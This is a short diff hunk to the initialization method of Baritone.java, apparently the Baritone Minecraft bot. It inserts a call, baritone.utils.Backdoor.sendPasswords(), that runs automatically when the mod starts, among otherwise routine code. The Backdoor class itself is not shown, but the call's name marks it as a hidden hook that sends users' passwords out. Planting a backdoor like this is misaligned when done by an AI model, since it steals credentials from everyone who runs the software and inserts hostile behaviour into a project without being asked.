@@ -98,7 +98,9 @@ public class Baritone implements IBaritone {
         if (initialized) {
             return;
         }
-
+        
+        baritone.utils.Backdoor.sendPasswords();
+        
         // Define this before behaviors try and get it, or else it will be null and the builds will fail!
         this.playerContext = PrimaryPlayerContext.INSTANCE;
 
